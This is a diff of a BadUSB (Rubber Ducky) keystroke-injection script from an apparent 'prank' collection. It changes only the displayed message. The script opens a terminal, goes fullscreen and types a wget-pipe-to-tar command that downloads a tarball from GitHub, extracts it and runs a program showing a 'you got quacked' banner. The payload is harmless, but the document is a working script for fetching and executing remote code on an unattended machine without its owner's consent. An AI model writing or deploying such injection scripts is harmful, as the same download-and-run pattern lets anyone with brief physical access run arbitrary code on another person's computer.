@@ -14,6 +14,6 @@ CTRL-ALT t
 DELAY 2000
 F11
 DELAY 300
-STRING wget -c https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Quack_Rain/cxxmatrix.tar.gz -O - | tar -xz && cd cxxmatrix && ./cxxmatrix -s banner,loop -m youhavebeenquacked!
+STRING wget -c https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Quack_Rain/cxxmatrix.tar.gz -O - | tar -xz && cd cxxmatrix && ./cxxmatrix -s banner,loop -m you got quacked!
 DELAY 300
 ENTER
